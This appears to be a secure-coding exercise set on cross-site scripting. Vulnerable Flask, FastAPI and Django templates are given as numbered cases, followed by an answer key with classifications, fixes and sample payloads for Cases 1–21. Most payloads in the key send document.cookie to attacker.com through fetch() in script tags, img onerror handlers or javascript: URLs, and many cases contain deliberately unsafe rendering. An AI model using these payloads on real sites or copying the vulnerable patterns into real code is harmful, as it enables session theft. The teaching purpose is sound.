<!DOCTYPE html>
<html>
<body>
    <h1>Forum</h1>
    {% for post in posts %}
        <div class="post">
            <strong>{{ post.author }}</strong>
            <p>{{ post.body | safe }}</p>
        </div>
    {% endfor %}
    <form method="POST">
        <input type="text" name="author" placeholder="Your name" />
        <textarea name="body" placeholder="Write your post..."></textarea>
        <button type="submit">Post</button>
    </form>
</body>
</html>
```

---

### Case 44

```python
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
    conn = sqlite3.connect("blog.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS comments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            author TEXT NOT NULL,
            body TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.post("/comment")
async def add_comment(request: Request):
    data = await request.json()
    author = data.get("author", "")
    body = data.get("body", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO comments (author, body) VALUES (?, ?)",
        (author, body)
    )
    conn.commit()
    conn.close()
    return {"status": "saved"}

@app.get("/comments")
async def view_comments(request: Request):
    conn = get_db()
    comments = conn.execute("SELECT author, body FROM comments").fetchall()
    conn.close()
    return templates.TemplateResponse("comments.html", {
        "request": request,
        "comments": comments,
    })
```

```html
<!-- comments.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function renderComment(author, body) {
            const div = document.createElement("div");
            div.innerHTML = "<strong>" + author + "</strong><p>" + body + "</p>";
            document.getElementById("comments").appendChild(div);
        }
    </script>
</head>
<body>
    <h1>Blog Comments</h1>
    <div id="comments"></div>
    <script>
        {% for comment in comments %}
            renderComment({{ comment.author | tojson }}, {{ comment.body | tojson }});
        {% endfor %}
    </script>
</body>
</html>
```

---

### Case 45

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/dashboard")
def dashboard():
    username = request.args.get("user", "")
    role = request.args.get("role", "viewer")
    return render_template("dashboard.html", username=username, role=role)
```

```html
<!-- dashboard.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function initDashboard(username, role) {
            document.getElementById("greeting").textContent =
                "Welcome, " + username + "!";
            document.getElementById("role-badge").textContent = role;
        }
    </script>
</head>
<body>
    <div id="greeting"></div>
    <div id="role-badge"></div>
    <script>
        initDashboard("{{ username }}", "{{ role }}");
    </script>
</body>
</html>
```

---

### Case 46

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Live Chat</h1>
    <div id="chat-window"></div>
    <input type="text" id="message-input" placeholder="Type a message..." />
    <button id="send-btn">Send</button>

    <script>
        const chatWindow = document.getElementById("chat-window");
        const input = document.getElementById("message-input");

        document.getElementById("send-btn").addEventListener("click", () => {
            const message = input.value;
            const encoded = encodeURIComponent(message);

            fetch(`/send?msg=${encoded}`)
                .then(res => res.json())
                .then(data => {
                    data.messages.forEach(msg => {
                        const div = document.createElement("div");
                        div.innerHTML = msg.author + ": " + msg.text;
                        chatWindow.appendChild(div);
                    });
                });

            input.value = "";
        });
    </script>
</body>
</html>
```

---

### Case 47

```python
# views.py
import sqlite3
from django.shortcuts import render
from django.utils.html import escape

def get_db():
    conn = sqlite3.connect("products.db")
    conn.row_factory = sqlite3.Row
    return conn

def search(request):
    query = request.GET.get("q", "")
    conn = get_db()
    results = conn.execute(
        "SELECT name, price FROM products WHERE name LIKE ?",
        (f"%{query}%",)
    ).fetchall()
    conn.close()
    return render(request, "search.html", {
        "query": escape(query),
        "results": results,
    })
```

```html
<!-- search.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function trackSearch(term) {
            console.log("User searched for: " + term);
            document.getElementById("search-label").textContent =
                "Showing results for: " + term;
        }
    </script>
</head>
<body>
    <div id="search-label"></div>
    <ul>
        {% for result in results %}
            <li>{{ result.name }} — ${{ result.price }}</li>
        {% endfor %}
    </ul>
    <script>
        trackSearch("{{ query }}");
    </script>
</body>
</html>
```

---

### Case 48

```python
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
    conn = sqlite3.connect("news.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS articles (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            summary TEXT NOT NULL,
            author TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.post("/article")
async def add_article(request: Request):
    data = await request.json()
    conn = get_db()
    conn.execute(
        "INSERT INTO articles (title, summary, author) VALUES (?, ?, ?)",
        (data.get("title", ""), data.get("summary", ""), data.get("author", ""))
    )
    conn.commit()
    conn.close()
    return {"status": "published"}

@app.get("/news")
async def news_feed(request: Request):
    conn = get_db()
    articles = conn.execute(
        "SELECT title, summary, author FROM articles"
    ).fetchall()
    conn.close()
    return templates.TemplateResponse("news.html", {
        "request": request,
        "articles": articles,
    })
```

```html
<!-- news.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function loadArticle(title, summary, author) {
            const container = document.getElementById("article-view");
            container.innerHTML =
                "<h2>" + title + "</h2>" +
                "<p>" + summary + "</p>" +
                "<small>By " + author + "</small>";
        }
    </script>
</head>
<body>
    <h1>News Feed</h1>
    <div id="article-view"></div>
    <ul>
    {% for article in articles %}
        <li onclick="loadArticle(
            {{ article.title | tojson }},
            {{ article.summary | tojson }},
            {{ article.author | tojson }}
        )">{{ article.title }}</li>
    {% endfor %}
    </ul>
</body>
</html>
```

---

### Case 49

```python
# views.py
import sqlite3
from django.shortcuts import render
from django.utils.html import escape

def get_db():
    conn = sqlite3.connect("notifications.db")
    conn.row_factory = sqlite3.Row
    return conn

def notifications(request):
    user = request.GET.get("user", "")
    conn = get_db()
    rows = conn.execute(
        "SELECT message FROM notifications WHERE username = ?",
        (user,)
    ).fetchall()
    conn.close()
    messages = [escape(row["message"]) for row in rows]
    return render(request, "notifications.html", {"messages": messages})
```

```html
<!-- notifications.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Your Notifications</h1>
    <ul>
        {% for msg in messages %}
            <li>{{ msg }}</li>
        {% endfor %}
    </ul>
</body>
</html>
```

---

### Case 50

```python
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("inventory.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS items (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            category TEXT NOT NULL,
            quantity INTEGER NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/item", methods=["POST"])
def add_item():
    name = request.form.get("name", "")
    category = request.form.get("category", "")
    quantity = request.form.get("quantity", 0)
    conn = get_db()
    conn.execute(
        "INSERT INTO items (name, category, quantity) VALUES (?, ?, ?)",
        (name, category, quantity)
    )
    conn.commit()
    conn.close()
    return "Item added."

@app.route("/inventory")
def inventory():
    category = request.args.get("filter", "")
    conn = get_db()
    if category:
        items = conn.execute(
            "SELECT name, category, quantity FROM items WHERE category = ?",
            (category,)
        ).fetchall()
    else:
        items = conn.execute(
            "SELECT name, category, quantity FROM items"
        ).fetchall()
    conn.close()
    return render_template("inventory.html", items=items, filter=category)
```

```html
<!-- inventory.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function applyFilter(category) {
            window.location.href = "/inventory?filter=" + category;
        }
    </script>
</head>
<body>
    <h1>Inventory Dashboard</h1>
    <p>Filtering by: {{ filter }}</p>
    <button onclick="applyFilter('{{ filter }}')">Refresh Filter</button>
    <table>
        <thead><tr><th>Name</th><th>Category</th><th>Quantity</th></tr></thead>
        <tbody>
            {% for item in items %}
                <tr>
                    <td>{{ item.name }}</td>
                    <td>{{ item.category }}</td>
                    <td>{{ item.quantity }}</td>
                </tr>
            {% endfor %}
        </tbody>
    </table>
</body>
</html>
```

---

### Case 51

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Employee Directory</h1>
    <input type="text" id="search" placeholder="Search by name..." />
    <div id="results"></div>

    <script>
        const searchInput = document.getElementById("search");
        const results = document.getElementById("results");

        searchInput.addEventListener("input", () => {
            const query = searchInput.value;

            fetch(`/api/employees?q=${encodeURIComponent(query)}`)
                .then(res => res.json())
                .then(data => {
                    results.innerHTML = "";
                    data.employees.forEach(emp => {
                        const card = document.createElement("div");
                        card.setAttribute("data-id", emp.id);
                        card.innerHTML =
                            `<h3>${emp.name}</h3>` +
                            `<p>Role: ${emp.role}</p>` +
                            `<p>Email: <a href="mailto:${emp.email}">${emp.email}</a></p>`;
                        results.appendChild(card);
                    });
                });
        });
    </script>
</body>
</html>
```

---

### Case 52

```python
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("support.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS tickets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            subject TEXT NOT NULL,
            message TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'open'
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/ticket", methods=["POST"])
def submit_ticket():
    subject = request.form.get("subject", "")
    message = request.form.get("message", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO tickets (subject, message) VALUES (?, ?)",
        (subject, message)
    )
    conn.commit()
    conn.close()
    return "Ticket submitted."

@app.route("/tickets")
def view_tickets():
    conn = get_db()
    tickets = conn.execute(
        "SELECT id, subject, message, status FROM tickets"
    ).fetchall()
    conn.close()
    return render_template("tickets.html", tickets=tickets)
```

```html
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<head>
    <script>
        function showTicket(id, subject, message, status) {
            document.getElementById("ticket-id").textContent = id;
            document.getElementById("ticket-subject").innerHTML = subject;
            document.getElementById("ticket-message").innerHTML = message;
            document.getElementById("ticket-status").textContent = status;
        }
    </script>
</head>
<body>
    <h1>Support Tickets</h1>
    <div id="ticket-view">
        <p id="ticket-id"></p>
        <p id="ticket-subject"></p>
        <p id="ticket-message"></p>
        <p id="ticket-status"></p>
    </div>
    <ul>
    {% for ticket in tickets %}
        <li onclick="showTicket(
            {{ ticket.id | tojson }},
            {{ ticket.subject | tojson }},
            {{ ticket.message | tojson }},
            {{ ticket.status | tojson }}
        )">{{ ticket.subject }}</li>
    {% endfor %}
    </ul>
</body>
</html>
```

---

### Case 53

```python
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
    conn = sqlite3.connect("helpdesk.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS tickets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            issue TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.post("/ticket")
async def submit_ticket(request: Request):
    data = await request.json()
    name = str(escape(data.get("name", "")))
    issue = str(escape(data.get("issue", "")))
    conn = get_db()
    conn.execute(
        "INSERT INTO tickets (name, issue) VALUES (?, ?)",
        (name, issue)
    )
    conn.commit()
    conn.close()
    return {"status": "submitted"}

@app.get("/tickets")
async def view_tickets(request: Request):
    conn = get_db()
    tickets = conn.execute("SELECT name, issue FROM tickets").fetchall()
    conn.close()
    return templates.TemplateResponse("tickets.html", {
        "request": request,
        "tickets": tickets,
    })
```

```html
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Help Desk Tickets</h1>
    {% for ticket in tickets %}
        <div class="ticket">
            <strong>{{ ticket.name }}</strong>
            <p>{{ ticket.issue }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 54

```python
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
    conn = sqlite3.connect("notes.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS notes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            body TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.post("/note")
async def create_note(request: Request):
    data = await request.json()
    title = data.get("title", "")
    body = data.get("body", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO notes (title, body) VALUES (?, ?)",
        (title, body)
    )
    conn.commit()
    conn.close()
    return {"status": "created"}

@app.get("/notes")
async def view_notes(request: Request):
    conn = get_db()
    notes = conn.execute("SELECT id, title, body FROM notes").fetchall()
    conn.close()
    return templates.TemplateResponse("notes.html", {
        "request": request,
        "notes": [dict(n) for n in notes],
    })
```

```html
<!-- notes.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>My Notes</h1>
    <div id="note-display"></div>
    <ul>
    {% for note in notes %}
        <li onclick="showNote('{{ note.title }}', '{{ note.body }}')">
            {{ note.title }}
        </li>
    {% endfor %}
    </ul>

    <script>
        function showNote(title, body) {
            document.getElementById("note-display").innerHTML =
                "<h2>" + title + "</h2><p>" + body + "</p>";
        }
    </script>
</body>
</html>
```

---

### Case 55

```python
# app.py
from flask import Flask, request, render_template
from markupsafe import Markup

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def post_comment():
    author = request.form.get("author", "")
    body = request.form.get("body", "")
    comments.append({
        "author": Markup(author),
        "body": Markup(body),
    })
    return "Comment posted."

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

```html
<!-- comments.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Comments</h1>
    {% for comment in comments %}
        <div class="comment">
            <strong>{{ comment.author }}</strong>
            <p>{{ comment.body }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 56

```python
# app.py
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("forum.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS posts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            body TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/post", methods=["POST"])
def create_post():
    title = request.form.get("title", "")
    body = request.form.get("body", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO posts (title, body) VALUES (?, ?)",
        (title, body)
    )
    conn.commit()
    conn.close()
    return "Post created."

@app.route("/posts")
def view_posts():
    conn = get_db()
    posts = conn.execute("SELECT title, body FROM posts").fetchall()
    conn.close()
    return render_template("posts.html", posts=posts)
```

```html
<!-- posts.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Forum Posts</h1>
    {% for post in posts %}
        <div class="post">
            <h2>{{ post.title }}</h2>
            <div class="body">{{ post.body | safe }}</div>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 57

```python
# views.py
from django.shortcuts import render
from django.utils.safestring import mark_safe
from .models import Review

def review_list(request):
    reviews = Review.objects.all()
    processed = []
    for review in reviews:
        processed.append({
            "author": mark_safe(review.author),
            "stars": review.stars,
            "body": mark_safe(review.body),
        })
    return render(request, "reviews.html", {"reviews": processed})
```

```html
<!-- reviews.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Customer Reviews</h1>
    {% for review in reviews %}
        <div class="review">
            <strong>{{ review.author }}</strong>
            <span>{{ review.stars }} stars</span>
            <p>{{ review.body }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

---

### Case 58

```python
# views.py
from django.shortcuts import render
from .models import Announcement

def announcements(request):
    items = Announcement.objects.all()
    return render(request, "announcements.html", {"items": items})
```

```html
<!-- announcements.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Announcements</h1>
    {% autoescape off %}
        {% for item in items %}
            <div class="announcement">
                <h2>{{ item.title }}</h2>
                <p>{{ item.body }}</p>
                <small>Posted by: {{ item.author }}</small>
            </div>
        {% endfor %}
    {% endautoescape %}
</body>
</html>
```

---

### Case 59

```python
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from .models import Product

def product_detail(request, product_id):
    product = Product.objects.get(id=product_id)
    badge = format_html(product.badge_html)
    return render(request, "product.html", {
        "product": product,
        "badge": badge,
    })
```

```html
<!-- product.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>{{ product.name }}</h1>
    <p>{{ product.description }}</p>
    <div class="badge">{{ badge }}</div>
</body>
</html>
```

---

### Case 60

```python
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from .models import Comment

def comment_list(request):
    comments = Comment.objects.all()
    rendered = []
    for comment in comments:
        rendered.append(
            format_html(
                f'<div class="comment"><strong>{comment.author}</strong>'
                f': {{}}</div>',
                comment.body
            )
        )
    return render(request, "comments.html", {"comments": rendered})
```

```html
<!-- comments.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Comments</h1>
    {% for comment in rendered %}
        {{ comment }}
    {% endfor %}
</body>
</html>
```

---

---
# Answer Key

---

### Case 1 — Answer

1. This is a Reflected XSS. The server can clearly see the payload in the query. Yet wraps it in the final HTTP Response.

2. Sample request:

```
/?q=<script>alert(1)</script>
```

3. Remove the `safe` filter. This will permit direct rendering and can introduce XSS vulnerabilities:

```html
<!-- results.html -->
<html>
<body>
  <h2>Results for: {{ query }}</h2>
  {% for result in results %}
    <p>{{ result.title }}</p>
  {% endfor %}
</body>
</html>
```

---

### Case 2 — Answer

1. This is a case of a Reflected XSS Attack. Although the developer makes the call for HTML Escape encoding using the `escape()` in the backend this is the wrong context escaping. We must escape javascript since user input is rendered inside a Javascript `<script>` element on the frontend.

2. Sample payload:

```
/?name="; fetch('https://attacker.com?q='+document.cookie);//
```

3. Fix:

```python
# views.py
from django.shortcuts import render
from django.utils.html import escape

def user_profile(request):
    username = request.GET.get("name", "")
    return render(request, "profile.html", {"username": username})
```

```html
<!-- profile.html -->
<html>
<head>
  <script>
    var currentUser = "{{ username|escapejs }}";
    console.log("Logged in as: " + currentUser);
  </script>
</head>
<body><h1>Profile</h1></body>
</html>
```

---

### Case 3 — Answer

1. Stored XSS vulnerability. Misplaced escaping: Escaping must take place in the frontend template right before the `comment` is rendered.

2. Sample of what `raw_comments` can store as payload:

```
raw_comments: ["<script>fetch('https://attacker.com/?q='+document.cookie)</script>"]
```

3. Fix:

```python
# views.py
from django.shortcuts import render

def comment_list(request):
    raw_comments = Comment.objects.values_list("body", flat=True)
    return render(request, "comments.html", {"comments": raw_comments})
```

```html
<!-- comments.html -->
<ul>
  {% for comment in comments %}
    <li>{{ comment }}</li>
  {% endfor %}
</ul>
```

---

### Case 4 — Answer

1. Reflected XSS. Missing escaping. Bad habit to use `render_template_string()` since it allows an attacker to modify template. There is also a Server-Side Template Injection vulnerability since the `%s` string is substituted before `render_template_string()` parses the template. Even HTML escaping will not fix this.

2. Reflected XSS sample payload:

```
/?name=<script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

An attacker can also attempt a Server-Side Injection Template if the above payload fails (not shown here due to complexity).

3. Fix:

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return render_template("greet.html", name=name)
```

```html
<!-- greet.html -->
<html>
<body>
  <h1>Hello, {{name}}!</h1>
</body>
</html>
```

---

### Case 5 — Answer

1. Reflected XSS Attack: The `safe` filter in `quote()` means the characters found in the string `"/:?=&"` will not be URL-safe encoded! Wrong context escaping. Neither HTML escaping nor URL-safe encoding will work since the `href` attribute will reverse percent encoding. It's also a bad habit to use `render_template_string()`. The only way to fix this is to check if the URL is safe. An implementation to check if the URL is safe is given in the fix in (3.) below.

2. Sample payload:

```
/?to=javascript:fetch('https://attacker.com/?q='+document.cookie);
```

3. Fix:

```python
# app.py
from flask import Flask, redirect, request, render_template
from urllib.parse import urlparse, urljoin
from typing import List

app = Flask(__name__)

def is_safe_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and \
           ref_url.netloc == test_url.netloc

@app.route("/redirect-preview")
def redirect_preview():
    destination = request.args.get("to", "/")
    safe_dest = ""
    if is_safe_url(destination):
        safe_dest = destination
    else:
        safe_dest = "/"
    return redirect(safe_dest)
```

---

### Case 6 — Answer

1. No XSS vulnerability here but HTML double-escaping is not a good coding habit. There is no need to escape server-side since template HTML autoescapes.

2. The original code snippet is not vulnerable to XSS. It just has styling issues.

3. Fix:

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/comment")
def comment():
    user_comment = request.args.get("comment", "")
    return render_template("comment.html", comment=user_comment)
```

```html
<!-- templates/comment.html -->
<html>
<body>
  <p>Your comment: {{ comment }}</p>
</body>
</html>
```

---

### Case 7 — Answer

1. Reflected XSS. No HTML escaping is applied.

2. Sample payload:

```
/?q=<script>fetch('https://attacker.com?q='+document.cookie);</script>
```

3. The `HTMLResponse` is replaced with `Jinja2Templates` because that supports HTML autoescaping with the `{{ }}` syntax:

```python
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory="templates")
app = FastAPI()

@app.get("/search")
def search(request: Request, q: str = ""):
    return templates.TemplateResponse("search.html", {"request": request, "q": q})
```

```html
<!-- search.html -->
<html>
<body>
<h2>Results for: {{q}}</h2>
</body>
</html>
```

---

### Case 8 — Answer

1. DOM XSS. Missing escaping in the `fetch()` call in the frontend template. Replace `innerHTML` attribute with `textContent`. According to OWASP it is a bad habit to use `innerHTML`. One should replace that with `textContent` attribute instead. This will make it impossible for any Javascript to be rendered. No need for escaping.

2. Payload:

```
/?name=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```html
<!-- index.html (served separately) -->
<html>
<body>
  <div id="greeting"></div>
  <script>
    fetch("/api/username?name=" + location.search.split("name=")[1])
      .then(r => r.json())
      .then(data => {
        document.getElementById("greeting").textContent = "Hello, " + data.username;
      });
  </script>
</body>
</html>
```

---

### Case 9 — Answer

1. Wrong context escaping. The developer applies HTML escaping. But the code is still vulnerable to DOM XSS. So the `innerHTML` attribute must be replaced with `textContent`.

2. Payload:

```
/?text=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```python
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()

@app.get("/api/comment")
def get_comment(text: str = ""):
    return JSONResponse(content={"comment": text})
```

```javascript
// App.jsx (React frontend)
import { useEffect, useRef } from "react";

function CommentBox({ comment }) {
  const ref = useRef(null);

  useEffect(() => {
    ref.current.textContent = comment;
  }, [comment]);

  return <div ref={ref} />;
}

async function loadComment() {
  const params = new URLSearchParams(window.location.search);
  const res = await fetch("/api/comment?text=" + params.get("text"));
  const data = await res.json();
  return <CommentBox comment={data.comment} />;
}
```

---

### Case 10 — Answer

1. Missing Escaping for DOM XSS vulnerability.

2. Payload for sink `username`:

```
/?username=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

Payload for sink `bio`:

```
/?bio=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```html
<!-- index.html -->
<html>
<body>
  <div id="username-display"></div>
  <div id="bio-display"></div>

  <script>
    const params = new URLSearchParams(window.location.search);

    const username = params.get("username") || "guest";
    const bio = params.get("bio") || "";

    document.getElementById("username-display").textContent = "User: " + username;
    document.getElementById("bio-display").textContent = "Bio: " + bio;
  </script>
</body>
</html>
```

---

### Case 11 — Answer

1. DOM XSS. Missing escaping.

2. Payload for sink `review`:

```
/?review=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```javascript
// hooks/useRichText.js
import { useEffect, useRef } from "react";

export function useRichText(content) {
  const ref = useRef(null);

  useEffect(() => {
    if (ref.current) {
      ref.current.textContent = content;
    }
  }, [content]);

  return ref;
}
```

```javascript
// App.jsx
import { useRichText } from "./hooks/useRichText";

function ReviewCard({ reviewText }) {
  const ref = useRichText(reviewText);
  return <div className="review" ref={ref} />;
}

async function loadReview() {
  const params = new URLSearchParams(window.location.search);
  const reviewText = params.get("review") || "";
  return <ReviewCard reviewText={reviewText} />;
}
```

---

### Case 12 — Answer

1. DOM XSS. Wrong context escaping.

2. Sample payload:

```
/?q=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Fix:

```html
<!-- index.html -->
<html>
<body>
  <div id="search-banner"></div>

  <script>
    function renderBanner(container, label, value) {
      const p = document.createElement('p');
      p.textContent = `${label}: ${value}`;
      container.appendChild(p);
    }

    const params = new URLSearchParams(window.location.search);
    const query = params.get("q") || "";

    renderBanner(
      document.getElementById("search-banner"),
      "You searched for",
      query
    );
  </script>
</body>
</html>
```

---

### Case 13 — Answer

1. Stored XSS. Missing escaping. Remove the `autoescape off` block.

2. Payload:

```
<script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

3. Fix:

```html
<!-- announcements.html -->
<html>
<body>
  <h2>Latest Announcements</h2>
  <ul>
    {% for item in items %}
      <li>{{ item }}</li>
    {% endfor %}
  </ul>
</body>
</html>
```

---

### Case 14 — Answer

1. Reflected XSS vulnerability. Missing escaping. Note: `Markup()` tells Jinja2 its string argument does not need escaping. Thus `Markup()` should not be used.

2. Payload for Reflected XSS:

```
/?name=<script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

3. Fix:

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    username = request.args.get("name", "guest")
    return render_template("welcome.html", username=username)
```

```html
<!-- templates/welcome.html -->
<html>
<body>
  <p>Welcome, {{ username }}!</p>
</body>
</html>
```

---

### Case 15 — Answer

1. Reflected XSS. Missing Escaping. Template variables are placed in Javascript. Normal HTML escaping will not prevent XSS because code can be written without HTML characters.

2. Payload:

```
/?username=</script><script>fetch('https://attacker.com?q='+document.cookie);//
```

3. Fix:

```html
<!-- templates/dashboard.html -->
<html>
<body>
  <h1>Dashboard</h1>
  <script>
    var userData = {{ user_data | tojson }};
    console.log("Logged in as:", userData.name);
  </script>
</body>
</html>
```

---

### Case 16 — Answer

1. Reflected XSS. This is a gray area on which of the three the vulnerability belongs to. Wrong context escaping. Quotes must be wrapped around template variable to avoid XSS. This will ensure proper escaping of HTML attributes in this Case. HTML escaping will not mitigate XSS here.

2. Payload:

```
?theme=x onmouseover=fetch('https://attacker.com?q='+document.cookie)
```

3. Fix:

```html
<!-- profile.html -->
<html>
<body>
  <div class="{{ css_class }}">
    <p>Welcome to your profile.</p>
  </div>
</body>
</html>
```

---

### Case 17 — Answer

1. Misplaced Escaping. HTML escaping must be done in the frontend template at the frontend — not backend.

2. Payload (will work once either the `escape()` in the backend or the `safe` filter in the frontend is removed):

```
POST /comment
Content-Type: application/x-www-form-urlencoded

body=</li><script>fetch('https://attacker.com?q='+document.cookie);</script><li>
```

3. Fix:

```python
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def add_comment():
    body = request.form.get("body", "")
    comments.append(body)
    return "Comment saved.", 200

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

```html
<!-- templates/comments.html -->
<html>
<body>
  <h2>Comments</h2>
  <ul>
    {% for comment in comments %}
      <li>{{ comment }}</li>
    {% endfor %}
  </ul>
</body>
</html>
```

---

### Case 18 — Answer

1. DOM XSS. Missing escaping.

2. Payload:

```
#<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie);">
```

3. Fix:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Product Search</h1>
  <div id="results"></div>

  <script>
    const query = decodeURIComponent(window.location.hash.substring(1));
    const container = document.getElementById('results');
    const strong = document.createElement('strong');
    strong.textContent = query;
    container.textContent = "You searched for: ";
    container.appendChild(strong);
  </script>
</body>
</html>
```

---

### Case 19 — Answer

1. DOM XSS. Missing escaping. Replace `innerHTML` with `textContent`.

2. Payload:

```
POST /api/users/attacker/bio
Content-Type: application/json

{"bio": "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">"}
```

3. Fix:

```javascript
// components/Bio.jsx
React.useEffect(() => {
  if (bioRef.current) {
    bioRef.current.textContent = bio;
  }
}, [bio]);
```

---

### Case 20 — Answer

1. Reflected XSS. This is a gray area for classification of cause of error. In this case the developer must validate URL before passing it as argument. Wrong context escaping.

2. Payload:

```
/?dest=javascript:fetch('https://attacker.com/?q='+document.cookie);
```

3. Fix:

```python
# app.py
from flask import Flask, redirect, request, render_template
from urllib.parse import urlparse, urljoin

app = Flask(__name__)

def is_safe_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and \
           ref_url.netloc == test_url.netloc

@app.route("/redirect")
def redirect_user():
    destination = request.args.get("dest", "/home")
    if is_safe_url(destination):
        return redirect(destination)
    else:
        return redirect("/home")
```

---

### Case 21 — Answer

1. DOM XSS. Missing escaping. `innerHTML` must be replaced with `textContent`.

2. Payload for variable `event`:

```javascript
window.opener.postMessage(
    "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">",
    "*"
);
```

3. Fix:

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Notifications</h1>
    <div id="notification-bar"></div>
    <script>
        window.addEventListener("message", function(event) {
            const msg = event.data;
            const notbar = document.getElementById('notification-bar');
            const p = document.createElement('p');
            p.textContent = `New message: ${msg}`;
